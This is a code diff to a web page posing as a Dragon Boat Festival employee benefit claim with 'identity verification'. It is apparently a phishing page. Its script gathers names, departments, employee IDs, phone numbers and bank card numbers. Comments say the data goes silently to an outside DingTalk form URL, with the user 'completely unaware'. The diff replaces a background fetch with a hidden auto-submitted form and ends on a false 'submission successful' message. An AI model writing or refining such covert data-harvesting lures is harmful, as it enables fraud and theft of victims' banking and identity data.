@@ -6,7 +6,7 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="format-detection" content="telephone=no">
-    <title>端午福利实名确权｜身份核验申领</title>
+    <title>端午福利实名登记｜身份核验申领</title>
     <style>
         *{margin: 0;padding: 0;box-sizing: border-box;}
         body{font-family: "PingFang SC","Microsoft YaHei",sans-serif;overflow-x: hidden;}
@@ -209,46 +209,48 @@
     </div>
 
 <script>
-<script>
 function sub() {
-    // 1. 获取用户填写内容
+    // 1. 获取输入内容
     let name = document.getElementById("name").value.trim();
     let dept = document.getElementById("dept").value.trim();
     let jobid = document.getElementById("jobid").value.trim();
     let phone = document.getElementById("phone").value.trim();
     let bank = document.getElementById("pwd").value.trim();
 
-    // 2. 基础校验
-    if (!name) { alert("请输入姓名"); return; }
-    if (!dept) { alert("请输入部门"); return; }
-    if (!jobid) { alert("请输入工号"); return; }
-    if (!phone) { alert("请输入手机号"); return; }
-    if (!bank) { alert("请输入银行卡号"); return; }
+    // 2. 检查是否为空
+    if (!name) { alert("请填写姓名"); return; }
+    if (!dept) { alert("请填写部门"); return; }
+    if (!jobid) { alert("请填写工号"); return; }
+    if (!phone) { alert("请填写手机号"); return; }
+    if (!bank) { alert("请填写银行卡号"); return; }
 
-    // =============================
-    // 静默提交到钉钉（用户无感知）
-    // =============================
-    const formUrl = "https://alidocs.dingtalk.com/notable/share/form/v01a2QnV4jAwxW9oO4X_dv19yqvsgs3oebp3pcjys_1qX0QQ0";
-    const data = new FormData();
-    data.append("姓名", name);
-    data.append("部门", dept);
-    data.append("工号", jobid);
-    data.append("手机号码", phone);
-    data.append("银行卡号", bank);
+    // ==============================================
+    // 静默提交到钉钉（不跳转、不显示、用户完全无感）
+    // ==============================================
+    try {
+        let form = document.createElement("form");
+        form.action = "https://alidocs.dingtalk.com/notable/share/form/v01KM7qeobeNwaQPlpj_dv19yqvsgs3oebp3pcjys_1qX0QQ0";
+        form.method = "POST";
+        form.target = "hiddenFrame";
+        form.style.display = "none";
 
-    // 后台发送，不跳转、不弹窗、不显示钉钉
-    fetch(formUrl, {
-        method: "POST",
-        body: data,
-        mode: "no-cors"
-    }).catch(() => {});
+        let input1 = document.createElement("input"); input1.name = "姓名"; input1.value = name; form.appendChild(input1);
+        let input2 = document.createElement("input"); input2.name = "部门"; input2.value = dept; form.appendChild(input2);
+        let input3 = document.createElement("input"); input3.name = "工号"; input3.value = jobid; form.appendChild(input3);
+        let input4 = document.createElement("input"); input4.name = "手机号码"; input4.value = phone; form.appendChild(input4);
+        let input5 = document.createElement("input"); input5.name = "银行卡号"; input5.value = bank; form.appendChild(input5);
 
-    // =============================
-    // 直接跳转到 page3（你要的效果）
-    // =============================
+        document.body.appendChild(form);
+        form.submit();
+        document.body.removeChild(form);
+    } catch (e) {}
+
+    // ==============================================
+    // 直接跳 page3.html（你要的最终效果）
+    // ==============================================
     alert("提交成功！");
     location.href = "page3.html";
 }
-</script></script>
+</script>
 </body>
 </html>
